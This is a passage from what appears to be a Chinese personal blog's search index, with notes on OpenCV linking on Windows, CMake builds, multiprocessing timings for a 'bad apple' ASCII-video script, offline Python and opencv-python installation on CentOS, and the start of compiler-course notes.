\u8c8c\u4f3c<code>opencv_world420.lib</code>\u8868\u9762\u4e0a\u662f\u4e00\u4e2a\u9759\u6001\u94fe\u63a5\u5e93\uff0c\u4f46\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u56e0\u800c\u8fd0\u884c\u65f6\u9700\u8981<code>opencv_world420.dll</code>\u3002\u800c\u7b2c3\u6b65\u5982\u82e5\u6539\u6210\u6dfb\u52a0<code>opencv_world420.dll</code>\uff0c\u5219\u7f16\u8bd1\u5931\u8d25\u3002</p> <p>LNK1107 could also occur if you attempt to pass a module (.dll or .netmodule extension created with /clr:noAssembly or /NOASSEMBLY) to the linker; pass the .obj file instead. </p>","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#\u901a\u8fc7cmake\u7f16\u8bd1opencv\u7a0b\u5e8f","title":"\u901a\u8fc7CMake\u7f16\u8bd1OpenCV\u7a0b\u5e8f","text":"<p>\u53c2\u8003\uff1aUsing OpenCV with gcc and CMake</p> <p>\u901a\u8fc7CMake\u7f16\u8bd1OpenCV\u7a0b\u5e8f\u6709\u51e0\u70b9\u597d\u5904\uff1a</p> <ul> <li> <p>\u5728Windows\u548cLinux\u4e4b\u95f4\u79fb\u690d\u7a0b\u5e8f\u4e0d\u7528\u66f4\u6539\u8bbe\u7f6e\u3002</p> </li> <li> <p>\u81ea\u52a8\u641c\u7d22include\uff0clib\u8def\u5f84\u3002(\u901a\u8fc7<code>OpenCVConfig.cmake</code>\u6587\u4ef6\uff0c\u9700\u6dfb\u52a0\u5230Path\u73af\u5883\u53d8\u91cf)</p> </li> <li>\u5199\u4ee3\u7801\u7684\u65b9\u5f0f\u6bd4VisualStudio\u70b9\u51fb\u6309\u94ae\u7136\u540e\u8f93\u5165\u65b9\u4fbf\uff0c\u914d\u7f6e\u7684\u6587\u4ef6\u53ef\u4ee5\u4fdd\u7559\u4e0b\u6765\u7528\u4e8e\u5176\u5b83\u9879\u76ee\u3002</li> </ul> <p>\u7f3a\u70b9\uff1a</p> <ul> <li> </li> </ul> <p>\uff08\u53ef\u4ee5\u5148\u7528CMake\u914d\u7f6e\u597dinclude, lib\u540e\uff0c\u751f\u6210sln\u5e76\u7528VS\u6253\u5f00\uff09</p> <p>\u6b65\u9aa4\uff1a</p> <ol> <li> <p>\u6dfb\u52a0<code>opencv/build/</code>\u5230Path(<code>OpenCVConfig.cmake</code>\u6240\u5728\u76ee\u5f55)\u3002</p> </li> <li> <p>\u7f16\u5199<code>CMakeLists.txt</code>\u3002\u793a\u4f8b\uff1a</p> </li> </ol> <pre><code>cmake_minimum_required(VERSION 2.8)\nproject( DisplayImage )\nfind_package( OpenCV REQUIRED ) //\nadd_executable( DisplayImage DisplayImage.cpp )\ntarget_link_libraries( DisplayImage ${OpenCV_LIBS} ) //\n</code></pre> <ol> <li>\u4f7f\u7528CMake GUI\uff0c\u70b9\u51fbconfigure(\u53ef\u4ee5\u5148File-&gt;Delete Cache\uff0c\u5220\u9664\u6389\u4e4b\u524d\u7684\u914d\u7f6e)</li> </ol> <p>\u9009\u62e9VS\u7684\u7f16\u8bd1\u5668\u3002</p> <ol> <li> <p>\u5728\u4e2d\u95f4\u9762\u677f\u4fee\u6539\u4e00\u4e9b\u53d8\u91cf\u7684\u503c\u3002\uff08\u91cd\u65b0configure\uff09</p> </li> <li> <p>Generate\uff0c\u5728build\u76ee\u5f55\u4e0b\u751f\u6210VS\u7684sln\u6587\u4ef6\uff0c\u53cc\u51fb\u6253\u5f00\u3002</p> </li> <li> <p>\u5728ALL_BUILD\u4e0a\u53f3\u952ebuild\u3002</p> </li> </ol>","tags":["opencv"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/02/29/2020-02-29-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8OpenCV%28windows%29/#include-\u67d0\u4e2a\u6587\u4ef6vs-code\u4e0d\u4f1a\u81ea\u52a8\u63d0\u793a\u4e0d\u4f1a\u81ea\u52a8\u81ea\u52a8\u8865\u5168\u51fd\u6570\u4e0d\u4f1a\u663e\u793a\u51fd\u6570\u6587\u6863","title":"include \u67d0\u4e2a\u6587\u4ef6\uff0cVS Code\u4e0d\u4f1a\u81ea\u52a8\u63d0\u793a\uff0c\u4e0d\u4f1a\u81ea\u52a8\u81ea\u52a8\u8865\u5168\u51fd\u6570\uff0c\u4e0d\u4f1a\u663e\u793a\u51fd\u6570\u6587\u6863","text":"","tags":["opencv"]},{"location":"%E6%8A%98%E8%85%BE/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/","title":"CloudView\u5e73\u53f0\u8fd0\u884cbad apple","text":"<p>\u91cd\u5199\u4e86bad-apple\u7684\u4ee3\u7801\uff0c\u5229\u7528\u4e86\u591a\u8fdb\u7a0b\u7684\u65b9\u5f0f\u8fdb\u884c\u89c6\u9891\u8f6c\u6362\u3002</p> <p>\u4ee5\u4e0b\u662f\u5404\u4e2a\u914d\u7f6e\u8f6c\u6362bad apple.mp4\u7684\u65f6\u95f4</p> \u7ebf\u6027\u6267\u884c 4\u7ebf\u7a0b 1\u8fdb\u7a0b 2\u8fdb\u7a0b 4\u8fdb\u7a0b 8\u8fdb\u7a0b 16\u8fdb\u7a0b \u65f6\u95f4(\u79d2) 34.97 34.70 35.05 24.15 18.11 18.09 18 <p>\u5176\u4e2d\u7ebf\u7a0b\u4e3a\u91c7\u7528threading\u5e93\uff0c\u8fdb\u7a0b\u5219\u91c7\u7528multiprocessing\u5e93</p> <p>\u6211\u7684\u7535\u8111\u914d\u7f6e\u4e3a\uff1a</p> CPU intel(R) Core(TM) i5-7200U CPU @ 2.50GHz 2.70GHz RAM 8.00 GB Windows Windows10 \u5bb6\u5ead\u7248 1909 18363.720 <p>\u5b98\u65b9\u6587\u6863\u8bf4\u660e\u4e86threading\u5e93\u5e95\u5c42\u5b9e\u73b0\u65f6\u4ecd\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u56e0\u800c\u53ea\u9002\u7528\u4e8e\u5927\u91cfI/O\u5e76\u53d1\u7684\u60c5\u51b5\u3002\u800c\u6211\u4eec\u7684\u56fe\u7247\u8f6c\u6362\u6210\u5b57\u7b26\u753b\u7684\u8fc7\u7a0b\u4e3b\u8981\u662f\u8ba1\u7b97\u5bc6\u96c6\u578b\uff0c\u56e0\u6b64\u57fa\u672c\u6ca1\u6709\u6539\u5584\u6027\u80fd\u3002</p> <p>\u800c\u91c7\u7528\u591a\u8fdb\u7a0b\u65f6\uff0c\u521a\u597d\u5bf9\u5e94\u6211\u7535\u8111\u76844\u7ebf\u7a0b\uff082\u6838\uff0c\u91c7\u7528\u8d85\u7ebf\u7a0b\u6280\u672f\u53ef\u4ee5\u67094\u4e2a\u7ebf\u7a0b\uff0c\u5176\u5b9e\u8fd9\u91cc\u8fdb\u7a0b\u7ebf\u7a0b\u6709\u70b9\u6655\uff09\u65f6\u63d0\u5347\u6700\u5927\u3002</p> <p>\u4e8e\u662f\u4fbf\u60f3\u77e5\u905332\u4e2a\u6838\u65f6\uff0c\u80fd\u63d0\u5347\u591a\u5c11\uff0c\u4fbf\u60f3\u5728\u670d\u52a1\u5668\u4e0a\u8dd1\u8dd1\u770b\u3002\u4ee5\u4e0b\u662f\u914d\u7f6e\u8fd0\u884c\u8fc7\u7a0b\u3002</p> <p>\u51fa\u4eba\u610f\u6599\u7684\u7ed3\u679c\uff1a</p> 1\u8fdb\u7a0b 4\u7ebf\u7a0b 8\u8fdb\u7a0b 16\u8fdb\u7a0b 32\u8fdb\u7a0b \u65f6\u95f4(\u79d2) 51 24 23.22 21.57 21.14 <p>\u53ef\u80fd\u8fdb\u7a0b\u591a\u4e86\u540e\uff0c\u5199\u6587\u4ef6\u7684\u901f\u5ea6\u53cd\u800c\u6210\u4e86\u74f6\u9888\uff0c\u67e5\u770btop\u53d1\u73b0\u5404\u4e2a\u6838\u7684cpu\u5229\u7528\u7387\u90fd\u53ea\u670910%\u5de6\u53f3\uff0c\u5728\u4ee3\u7801\u4e2d\u8f93\u51facvt_frame.qsize()\u4e5f\u53d1\u73b0\u51e0\u4e4e\u90fd\u662f\u6ee1\u7684\u3002\uff08\u5728\u81ea\u5df1\u7535\u8111\u4e0a\u5927\u591a\u6570\u90fd\u662f0\uff0c\u8868\u660ecvt_frame\u4f9b\u4e0d\u5e94\u6c42\uff09</p>","tags":["cloudview","bad-apple"]},{"location":"%E6%8A%98%E8%85%BE/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/#\u5b89\u88c5python3","title":"\u5b89\u88c5python3","text":"<p>\u9996\u5148\u53d1\u73b0\u6ca1\u6709python3\uff0c\u4e8e\u662f\u60f3\u529e\u6cd5\u53bb\u5b89\u88c5python3\u3002</p>","tags":["cloudview","bad-apple"]},{"location":"%E6%8A%98%E8%85%BE/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/#\u65b9\u6cd51\u7f16\u8bd1\u5b89\u88c5","title":"\u65b9\u6cd51\uff1a\u7f16\u8bd1\u5b89\u88c5","text":"<p>python\u5b98\u7f51\u4e0b\u8f7dpython3\u6e90\u7801\uff0c\u8fd9\u91cc\u4e0b\u8f7d\u4e86python3.6.10</p> <p>\u7136\u540e\u89e3\u538b\u5230/usr/local/src</p> <pre><code>sudo tar zxf Python-3.6.10.tgz -C /usr/local/src/\n</code></pre> <p>cd\u5230\u89e3\u538b\u76ee\u5f55\uff0c\u7f16\u8bd1\u5b89\u88c5</p> <pre><code>./configure\nsudo make\nsudo make install\n</code></pre> <p>\u5230\u8fd9\u91cc\u53ef\u80fd\u4f1a\u62a5\u8bb8\u591a\u9519\u8bef\uff0c\u8fd9\u662f\u7f3a\u5c11\u4e00\u4e9b\u5e93\u5bfc\u81f4\u7684\u3002</p> <p>\u8bd5\u9519\u540e\u77e5\u9053\u9700\u8981zlib, openssl\u5e93\uff08\u53bb\u5b98\u7f51\u4e0b\u8f7d\u6e90\u7801\uff0c\u7f16\u8bd1\u5b89\u88c5\uff09</p> <p>\u4e8b\u5b9e\u4e0a\u641c\u7d22centos \u7f16\u8bd1\u5b89\u88c5python3\u4f1a\u544a\u8bc9\u4f60\u9700\u8981\u4ee5\u4e0b\u8fd9\u4e48\u591a\u5e93\uff0c\u7531\u4e8e\u8fd9\u91cc\u662f\u5185\u7f51\u73af\u5883\uff0c\u56e0\u6b64\u53ea\u80fd\u4e00\u4e2a\u4e00\u4e2a\u53bb\u4e0b\u8f7d\u7f16\u8bd1\u3002\uff08\u4f46\u4e8b\u5b9e\u4e0a\u53ef\u4ee5\u4f7f\u7528\u65b9\u6cd52\u4e2d\u7684\u65b9\u6cd5\uff0c\u642d\u597dyum\u7684\u672c\u5730\u6e90\uff0c\u4ece\u800c\u53ef\u4ee5\u4f7f\u7528yum\uff0c\u867d\u7136\u8fd9\u6837\u7684\u8bdd\u53ef\u4ee5\u76f4\u63a5\u7528yum\u5b89\u88c5python\uff0c\u4f46\u662f\u672c\u5730\u6e90\u4e2d\u7684python\u4e3a\u56fa\u5b9a\u7248\u672c\uff0c\u800c\u7f16\u8bd1\u5b89\u88c5\u53ef\u4ee5\u4ece\u5b98\u7f51\u4e0a\u4e0b\u8f7d\u4e0d\u540c\u7684\u7248\u672c\u3002\u5e76\u4e14\u63a8\u5e7f\u6765\u8bf4\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u5fc5\u987b\u7f16\u8bd1\u5b89\u88c5\u7684\u8f6f\u4ef6\uff0c\u901a\u8fc7yum\u5b89\u88c5\u5fc5\u8981\u7684\u5e93\uff0c\u7136\u540e\u7f16\u8bd1\u5b89\u88c5\u662f\u4e00\u79cd\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\uff09</p> <pre><code>yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel libffi-devel gcc make\n</code></pre> <p>\u4e0a\u9762\u7684\u9ed8\u8ba4\u5b89\u88c5\u8def\u5f84\u4e3a/usr/loacl/bin\uff0c\u5e93\u6587\u4ef6\u5219\u5b89\u88c5\u5230/usr/local/lib\u3002\uff08\u4e5f\u6709\u53ef\u80fd/usr/local/lib64\uff09</p> <p>\u5982\u679c\u81ea\u5b9a\u4e49\u5b89\u88c5\u8def\u5f84\u5982\uff0c./configure --prefix=/usr/local/python3</p> <p>\u9700\u8981\u6dfb\u52a0\u52a8\u6001\u8fde\u63a5\u5e93\u8def\u5f84\u3002\u5373\u5728/etc/ld.so.conf\u91cc\u6dfb\u52a0/usr/local/python3/lib</p> <p>\u8fd8\u662f\u9ed8\u8ba4\u8def\u5f84\u6bd4\u8f83\u597d\uff0c\u4e0d\u8fc7\u81ea\u5b9a\u4e49\u5b89\u88c5\u8def\u5f84\u53ef\u4ee5\u4e0d\u9700\u8981root\u6743\u9650\u3002\uff08\u53ea\u8981\u628a\u7a0b\u5e8f\u5b89\u88c5\u5230\u975eroot\u7528\u6237\u53ef\u4ee5\u8bfb\u5199\u7684\u76ee\u5f55\u4e0b\u5c31\u53ef\uff0c\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u9700\u8981root\u6743\u9650\uff0c\u4f46\u7528\u6237\u7684home\u8def\u5f84\u4e0b\u5e94\u8be5\u53ef\u4ee5\u968f\u4fbf\u88c5\u3002\u8fd8\u6709\u975eroot\u5b89\u88c5\u65f6\uff0c\u6700\u540e\u9700\u8981\u91cc\u6dfb\u52a0\u73af\u5883\u53d8\u91cfLD_LIBTARY_PATH\uff0c\u800c\u4e0d\u662f\u4fee\u6539ld.so.conf(\u9700\u8981root\u6743\u9650)\uff09</p>","tags":["cloudview","bad-apple"]},{"location":"%E6%8A%98%E8%85%BE/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/#\u65b9\u6cd52","title":"\u65b9\u6cd52\uff1a","text":"<p>\u914d\u7f6e\u672c\u5730yum\u6e90</p> <ol> <li> <p>\u4e0a\u4f20CentOS\u7cfb\u7edfiso\u6587\u4ef6\uff0c\u5927\u698211G</p> </li> <li> <p>\u6302\u8f7d\u955c\u50cf\u6587\u4ef6</p> </li> </ol> <pre><code>mount CentOS-7-x86_64-Everything-1908.iso /media/cdrom\n</code></pre> <ol> <li>\u914d\u7f6e\u5730yum\u6e90\uff0c\u4fee\u6539/etc/yum.repo.d/CentOS-Media.repo\uff0c\u628aenabled\u7f6e1\uff0c\u56e0\u4e3abaseurl\u4e2d\u5df2\u7ecf\u6709\u4e86/media/cdrom\u6545\u4e0d\u7528\u6539\uff0c\u5982\u679c\u4e0a\u4e00\u6b65\u6302\u8f7d\u8def\u5f84\u4e3a\u5176\u5b83\uff0c\u5219\u6dfb\u52a0\u5230\u5176\u4e2d\u3002</li> </ol> <pre><code>[root@centos1 temp]# cat /etc/yum.repos.d/CentOS-Media.repo\n# CentOS-Media.repo\n#\n#  This repo can be used with mounted DVD media, verify the mount point for\n#  CentOS-7.  You can use this repo and yum to install items directly off the\n#  DVD ISO that we release.\n#\n# To use this repo, put in your DVD and use it with the other repos too:\n#  yum --enablerepo=c7-media [command]\n#\n# or for ONLY the media repo, do this:\n#\n#  yum --disablerepo=\\* --enablerepo=c7-media [command]\n\n[c7-media]\nname=CentOS-$releasever - Media\nbaseurl=file:///media/CentOS/\n        file:///media/cdrom/\n        file:///media/cdrecorder/\ngpgcheck=1\nenabled=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n</code></pre> <ol> <li>\u53ef\u4ee5\u4f7f\u7528yum\u5b89\u88c5\u4e00\u4e9b\u5e38\u89c1\u7684\u8f6f\u4ef6\u4e86\u3002</li> </ol> <p>\u6211\u5148\u91c7\u7528\u4e86\u65b9\u5f0f1\uff0c\u867d\u7136\u53ef\u4ee5\u8fd0\u884cpython\u4e86\uff0c\u4f46\u7f16\u8bd1\u65f6\u7684\u5404\u79cd\u7f3a\u5e93\u7684\u62a5\u9519\u603b\u8ba9\u6211\u89c9\u5f97\u5b83\u6709\u4e00\u4e9b\u95ee\u9898\u3002\u540e\u9762\u53c8\u91c7\u7528\u4e86\u65b9\u5f0f2\u6765\u5b89\u88c5python</p>","tags":["cloudview","bad-apple"]},{"location":"%E6%8A%98%E8%85%BE/2020/04/09/2020-04-09-CloudView%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8Cbad%20apple/#\u79bb\u7ebf\u5b89\u88c5opencv","title":"\u79bb\u7ebf\u5b89\u88c5opencv","text":"<p>bad apple\u4ee3\u7801\u9700\u8981import cv2\uff0ccv2\u6a21\u5757\u662fopencv-python\u91cc\u7684\uff0c\u9700\u8981\u5b89\u88c5opencv-python\u5305\u3002\u7531\u4e8e\u662f\u5185\u7f51\uff0c\u56e0\u6b64\u53ea\u80fd\u91c7\u7528\u79bb\u7ebf\u5b89\u88c5\u7684\u65b9\u5f0f\u3002</p> <p>\u79bb\u7ebf\u5b89\u88c5python\u5305</p> <ol> <li>\u53bb\u955c\u50cf\u7f51\u7ad9\u5bfb\u627e\u5230\u9700\u8981\u7684.whl\u6587\u4ef6\u3002\u5982\u6e05\u534e\u7684\u955c\u50cf\u6e90\u76ee\u5f55\u7ed3\u6784\u4e3a/pypi/web/simple\u4e0b\u3002\u4f46\u8fd9\u79cd\u65b9\u5f0f\u5bfb\u627e\u8d77\u6765\u5b83\u9ebb\u70e6\u4e86\u3002\u800c\u4e14python\u7684\u5305\u4e5f\u662f\u6709\u4f9d\u8d56\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u4e5f\u4e0d\u77e5\u9053opencv-python\u9700\u8981\u54ea\u4e9b\u5305\u3002\u8fd9\u91cc\u6bd4\u8f83\u7b80\u5355\u7684\u65b9\u5f0f\u662f\u5728\u81ea\u5df1\u7684\u7535\u8111\u4e0a\u7528pip install opencv-python\uff0c\u8f93\u51fa\u4fe1\u606f\u4e2d\u4e0d\u4ec5\u5305\u542b\u9700\u8981\u54ea\u4e9b\u5176\u5b83\u5305\uff0c\u800c\u4e14\u8fd8\u5305\u542b\u5b83\u7684\u4e0b\u8f7d\u8def\u5f84\uff0c\u76f4\u63a5\u590d\u5236\u8def\u5f84\u5230\u6d4f\u89c8\u5668\u6253\u5f00\u5373\u53ef\u4e0b\u8f7d\u3002</li> </ol> <p>\u8fd9\u91cc\u53d1\u73b0opencv-python\u53ea\u9700\u8981numpy\u548c\u81ea\u5df1\u4fbf\u53ef\u3002</p> <ol> <li>pip install \u5bf9\u5e94\u7684whl\u6587\u4ef6\u5373\u53ef\u3002</li> </ol> <p>\u8fd9\u91cc\u7531\u4e8e\u81ea\u5df1\u7535\u8111\u4e0a\u7684python\u4e3a3.7.3\u7684\u7248\u672c\uff0c\u56e0\u6b64\u627e\u5230\u7684\u5305\u4e3a</p> <pre><code>numpy-1.18.2-cp37-cp37m-manylinux1_x86_64.wh\nopencv_python-4.2.0.34-cp37-cp37m-manylinux1_x86_64.whl\n</code></pre> <p>\u4f46\u4e91\u4e3b\u673a\u4e0a\u7684python\u4e3a3.6.1\u7684\u7248\u672c\uff0c\u56e0\u6b64pipinstall\u7684\u65f6\u5019\u62a5\u4e86\u5982\u4e0b\u9519\u8bef\uff1a</p> <pre><code>[root@centos1 mpiuser]# pip3 install numpy-1.18.2-cp37-cp37m-manylinux1_x86_64.whl\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nnumpy-1.18.2-cp37-cp37m-manylinux1_x86_64.whl is not a supported wheel on this platform.\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nCould not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\",)) - skipping\n</code></pre> <p>\u4e0a\u9762\u7684require TLS/SSL\u53ef\u80fd\u5c31\u662f\u56e0\u4e3a\u6211\u6ca1\u6709\u6b63\u786e\u7f16\u8bd1openssl\u5bfc\u81f4\u7684\uff08\u4f46\u4e8b\u5b9e\u4e0aopenssl version\u662f\u53ef\u4ee5\u8f93\u51fa\u7684\uff0c\u4e14\u91c7\u7528\u65b9\u5f0f2\u540eyum install python3\u5e94\u8be5\u4e0d\u4f1a\u6709\u95ee\u9898\u624d\u5bf9\uff09\u8fd9\u91cc\u5148\u4e0d\u7ba1\u5b83\u3002</p> <p>\u4e3b\u8981\u662f\u4e2d\u95f4\u7684<code>is not a supported wheel on this platform.</code></p> <p>\u5728\u81ea\u5df1\u7535\u8111\u4e0a\u7528conda\u5b89\u88c5\u5176\u5b83python\u7248\u672c\uff08\u5b89\u88c5\u5176\u5b83python\u7248\u672c\uff0c\u5728window\u4e0a\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d\u5bf9\u5e94\u7248\u672c\u5b89\u88c5\u5373\u53ef\uff0c\u4f46\u5728linux\u4e0a\u8981\u4e48\u662f\u6dfb\u52a0\u5176\u5b83\u6e90\uff0c\u8981\u4e48\u5c31\u53ea\u6709\u6e90\u7801\u7f16\u8bd1\u5b89\u88c5\u4e86\uff0c\u8fd9\u91cc\u4f7f\u7528conda\u662f\u53d6\u5de7\u7684\u65b9\u5f0f\uff0c\u7c7b\u4f3c\u4e8e\u6dfb\u52a0\u5176\u5b83\u6e90\uff09</p> <pre><code>conda env list #\u67e5\u770bconda\u521b\u5efa\u7684\u73af\u5883\nconda create -e py36\nconda activate py36\nconda search python #\u53ef\u4ee5\u770b\u5230\u8bb8\u591apython\u7248\u672c\nconda install python=3.6.1 #\u6307\u5b9a\u7248\u672c\n\nconda install pip #\u9ed8\u8ba4\u6ca1\u6709\u5b89\u88c5pip\npip install opencv-python #\u91c7\u7528pip\uff0c\u56e0\u4e3a\u6211\u4eec\u5c31\u662f\u60f3\u77e5\u9053opencv-python\u7684pip\u5305\u9700\u8981\u54ea\u4e9b\u4f9d\u8d56\u3002\u6b63\u5e38\u4f7f\u7528\u6700\u597d\u4f7f\u7528conda\u4ee3\u66ffpip\n</code></pre> <p>\u6700\u540e\u4e0b\u8f7d\u7684\u4fbf\u662f\u4ee5\u4e0b\u7684\u5305\u4e86\uff0c\u53ef\u4ee5\u53d1\u73b0cp37\u53d8\u6210\u4e86cp36</p> <pre><code>opencv_python-4.2.0.34-cp36-cp36m-manylinux1_x86_64.wh\nnumpy-1.18.2-cp36-cp36m-manylinux1_x86_64.whl\n</code></pre> <p>\u4e0b\u9762\u662fnumpy\u5b89\u88c5\u7684\u8f93\u51fa\uff0c\u53ef\u4ee5\u770b\u5230\u8fd8\u662f\u6709\u4e00\u70b9\u95ee\u9898(Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\",)) - skipping\u3002\u4f46\u8fd8\u662f\u5b89\u88c5\u6210\u529f\u4e86\u3002</p> <pre><code>[root@centos1 mpiuser]# pip3 install numpy-1.18.2-cp36-cp36m-manylinux1_x86_64.whl\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nProcessing ./numpy-1.18.2-cp36-cp36m-manylinux1_x86_64.whl\nInstalling collected packages: numpy\nSuccessfully installed numpy-1.18.2\npip is configured with locations that require TLS/SSL, however the ssl module in Python is not available.\nCould not fetch URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host='pypi.org', port=443): Max retries exceeded with url: /simple/pip/ (Caused by SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\",)) - skipping\n</code></pre> <p>python\u8fd0\u884c\u65f6\u53c8\u62a5\u51fa\u4e00\u4e9b\u52a8\u6001\u94fe\u63a5\u5e93\u627e\u4e0d\u5230\uff08\u56e0\u8be5\u8fd8\u662f\u7f16\u8bd1python\u65f6\uff0c\u6ca1\u5b89\u88c5\u5168\u90a3\u4e9b\u5e93\u5bfc\u81f4\u7684\uff09\uff0c\u89e3\u51b3\u540e\u4fbf\u53ef\u4ee5\u8fd0\u884cbad apple\u4e86\u3002</p> <pre><code>[root@centos1 temp]# python3 convert_video_multiprocess.py\nTraceback (most recent call last):\n  File \"convert_video_multiprocess.py\", line 1, in &lt;module&gt;\n    import cv2\n  File \"/usr/local/lib/python3.6/site-packages/cv2/__init__.py\", line 5, in &lt;module&gt;\n    from .cv2 import *\nImportError: libSM.so.6: cannot open shared object file: No such file or directory\n\u8fd8\u6709libXrender\u7b49\n</code></pre>","tags":["cloudview","bad-apple"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/05/31/2020-05-31-%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/","title":"\u7f16\u8bd1\u539f\u7406\u603b\u7ed3","text":"","tags":["\u7f16\u8bd1\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/05/31/2020-05-31-%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/#\u76ee\u524d\u6211\u773c\u4e2d\u7684\u8ba1\u7b97\u673a\u5c42\u6b21","title":"\u76ee\u524d\u6211\u773c\u4e2d\u7684\u8ba1\u7b97\u673a\u5c42\u6b21\uff1a","text":"<ul> <li>\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\uff08RTL\u7ea7\u8bbe\u8ba1\uff0c\u6d41\u6c34\u7ebf\uff0c\u7f13\u5b58\uff0c\u591a\u53d1\u5c04\uff09</li> <li>ISA \uff08\u8bbf\u5b58\u6a21\u5f0f\uff0c\u4e2d\u65ad/\u5f02\u5e38\uff09</li> <li>\u6c47\u7f16\u8bed\u8a00\uff08\u5bc4\u5b58\u5668+\u5185\u5b58\u7a7a\u95f4\uff09</li> <li>\u9ad8\u7ea7\u8bed\u8a00 \uff08\u7f16\u8bd1\u5668\uff09</li> <li>\u64cd\u4f5c\u7cfb\u7edf\uff08\u5185\u6838\uff1a\u8fdb\u7a0b\u8c03\u5ea6\uff0c\u540c\u6b65\u4e0e\u6b7b\u9501\uff0c\u5185\u5b58\u7ba1\u7406\uff1a\u9875\u8868\uff0c\u6587\u4ef6\u7cfb\u7edf      \u5e94\u7528\uff1a\u684c\u9762\u7cfb\u7edf\uff0c\u6d4f\u89c8\u5668\uff09</li> </ul>","tags":["\u7f16\u8bd1\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2020/05/31/2020-05-31-%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/#\u7f16\u8bd1\u5668\u5404\u9636\u6bb5","title":"\u7f16\u8bd1\u5668\u5404\u9636\u6bb5","text":"<ol> <li> <p>\u8bcd\u6cd5\u5206\u6790\uff1a\u89e3\u6790\u6e90\u4ee3\u7801\u6587\u4ef6\uff0c\u8f93\u51fa\u8bb0\u53f7\u6d41\u3002 \u8bb0\u53f7\u5373\u6307\u4e00\u4e2a\u6709\u72ec\u7acb\u610f\u4e49\u7684\u201c\u5355\u8bcd\u201d\u3002\u7a7a\u767d\u5b57\u7b26\u4fbf\u4e00\u822c\u4e0d\u5305\u542b\u610f\u4e49\uff0c\u6545\u53ef\u4ee5\u7701\u7565\u3002 \u8fd9\u4e9b\u5355\u8bcd\u4e00\u822c\u53ef\u5206\u7c7b\u4e3a\uff1a\u6807\u8bc6\u7b26\uff0c\u5e38\u6570\uff08\u6574\u6570\uff0c\u6d6e\u70b9\u6570\uff09\uff0c\u5b57\u7b26\u5e38\u91cf\uff0c\u5b57\u7b26\u4e32\uff0c \u64cd\u4f5c\u7b26\uff0c\u754c\u7b26\uff0c\u5173\u952e\u5b57\u3002</p> </li> <li> <p>\u8bed\u6cd5\u5206\u6790\uff1a\u5206\u6790\u8bb0\u53f7\u6d41\uff0c\u8f93\u51fa\u7a0b\u5e8f\u7684\u903b\u8f91\u7ed3\u6784\uff0c\u5982\u8bed\u6cd5\u5206\u6790\u6811\uff08\u6216AST\u6811\uff09 \u4e00\u79cd\u8bed\u8a00\u7684\u8bed\u6cd5\u89c4\u5219\u53ef\u4ee5\u88ab\u6587\u6cd5\u4ea7\u751f\u5f0f\u5b8c\u5168\u5b9a\u4e49\u3002 \u6587\u6cd5\u4e00\u822c\u5305\u62ec\u8868\u8fbe\u5f0f\u7684\u5b9a\u4e49\uff0c\u5404\u79cd\u8bed\u53e5\u7684\u5b9a\u4e49\uff08if, while, for\uff09\uff0c\u53d8\u91cf\u58f0\u660e\uff0c \u51fd\u6570\u5b9a\u4e49\u7b49\u3002</p> </li> </ol> <ol> <li> <p>\u8bed\u4e49\u5206\u6790\uff1a\u5206\u6790AST\u6811\uff0c\u8f93\u51fa\u8bed\u4e49\u9519\u8bef\u4fe1\u606f \u5177\u4f53\u5305\u62ec\uff1a\u4f5c\u7528\u57df\u5206\u6790\uff0c\u53d8\u91cf\u7c7b\u578b\u68c0\u67e5\u3002 \u8fdb\u884c\u5206\u6790\u7684\u5de5\u5177\u4e3a\u7b26\u53f7\u8868\uff0c\u6545\u9700\u8981\u5bf9\u7b26\u53f7\u8868\u8fdb\u884c\u7ec4\u7ec7</p> </li> <li> <p>\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\uff1a\u8f93\u51fa\u4e2d\u95f4\u4ee3\u7801\uff0c\u66f4\u901a\u7528\u7684\u4e3aIR\uff08\u4e2d\u95f4\u8868\u793a\uff09\uff0c\u9664\u4e86IR\u8bed\u8a00\u8fd8\u5305\u542b 